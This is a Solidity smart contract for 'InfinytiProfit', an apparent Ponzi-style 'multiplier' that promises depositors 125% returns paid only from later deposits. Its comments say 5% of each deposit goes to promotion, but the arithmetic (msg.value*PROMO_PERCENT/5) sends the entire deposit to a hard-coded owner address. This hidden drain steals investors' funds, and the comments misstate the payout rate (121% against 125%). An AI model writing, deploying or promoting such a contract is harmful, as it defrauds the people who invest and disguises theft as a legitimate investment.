1 pragma solidity ^0.4.25;
2 
3 /**
4   Web: http://infinyti-profit.ru/
5 */
6 
7 contract InfinytiProfit {
8     //Address for promo expences
9     address constant private PROMO = 0x1709e81Fe058c96865B48b319070e8e75604D20a;
10     //Percent for promo expences
11     uint constant public PROMO_PERCENT = 5; //4 for advertizing, 1 for techsupport
12     //How many percent for your deposit to be multiplied
13     uint constant public MULTIPLIER = 125;
14 
15     //The deposit structure holds all the info about the deposit made
16     struct Deposit {
17         address depositor; //The depositor address
18         uint128 deposit;   //The deposit amount
19         uint128 expect;    //How much we should pay out (initially it is 121% of deposit)
20     }
21 
22     Deposit[] private queue;  //The queue
23     uint public currentReceiverIndex = 0; //The index of the first depositor in the queue. The receiver of investments!
24 
25     //This function receives all the deposits
26     //stores them and make immediate payouts
27     function () public payable {
28         require(block.number >= 6618692);
29         
30         if(msg.value > 0){
31             require(gasleft() >= 220000, "We require more gas!"); //We need gas to process queue
32             require(msg.value <= 5 ether); //Do not allow too big investments to stabilize payouts
33 
34             //Add the investor into the queue. Mark that he expects to receive 121% of deposit back
35             queue.push(Deposit(msg.sender, uint128(msg.value), uint128(msg.value*MULTIPLIER/100)));
36 
37             //Send some promo to enable this contract to leave long-long time
38             uint promo = msg.value*PROMO_PERCENT/5;
39             PROMO.transfer(promo);
40 
41             //Pay to first investors in line
42             pay();
43         }
44     }
45 
46     //Used to pay to current investors
47     //Each new transaction processes 1 - 4+ investors in the head of queue 
48     //depending on balance and gas left
49     function pay() private {
50         //Try to send all the money on contract to the first investors in line
51         uint128 money = uint128(address(this).balance);
52 
53         //We will do cycle on the queue
54         for(uint i=0; i<queue.length; i++){
55 
56             uint idx = currentReceiverIndex + i;  //get the index of the currently first investor
57 
58             Deposit storage dep = queue[idx]; //get the info of the first investor
59 
60             if(money >= dep.expect){  //If we have enough money on the contract to fully pay to investor
61                 dep.depositor.transfer(dep.expect); //Send money to him
62                 money -= dep.expect;            //update money left
63 
64                 //this investor is fully paid, so remove him
65                 delete queue[idx];
66             }else{
67                 //Here we don't have enough money so partially pay to investor
68                 dep.depositor.transfer(money); //Send to him everything we have
69                 dep.expect -= money;       //Update the expected amount
70                 break;                     //Exit cycle
71             }
72 
73             if(gasleft() <= 50000)         //Check the gas left. If it is low, exit the cycle
74                 break;                     //The next investor will process the line further
75         }
76 
77         currentReceiverIndex += i; //Update the index of the current first investor
78     }
79 
80     //Get the deposit info by its index
81     //You can get deposit index from
82     function getDeposit(uint idx) public view returns (address depositor, uint deposit, uint expect){
83         Deposit storage dep = queue[idx];
84         return (dep.depositor, dep.deposit, dep.expect);
85     }
86 
87     //Get the count of deposits of specific investor
88     function getDepositsCount(address depositor) public view returns (uint) {
89         uint c = 0;
90         for(uint i=currentReceiverIndex; i<queue.length; ++i){
91             if(queue[i].depositor == depositor)
92                 c++;
93         }
94         return c;
95     }
96 
97     //Get all deposits (index, deposit, expect) of a specific investor
98     function getDeposits(address depositor) public view returns (uint[] idxs, uint128[] deposits, uint128[] expects) {
99         uint c = getDepositsCount(depositor);
100 
101         idxs = new uint[](c);
102         deposits = new uint128[](c);
103         expects = new uint128[](c);
104 
105         if(c > 0) {
106             uint j = 0;
107             for(uint i=currentReceiverIndex; i<queue.length; ++i){
108                 Deposit storage dep = queue[i];
109                 if(dep.depositor == depositor){
110                     idxs[j] = i;
111                     deposits[j] = dep.deposit;
112                     expects[j] = dep.expect;
113                     j++;
114                 }
115             }
116         }
117     }
118     
119     //Get current queue size
120     function getQueueLength() public view returns (uint) {
121         return queue.length - currentReceiverIndex;
122     }
123 
124 }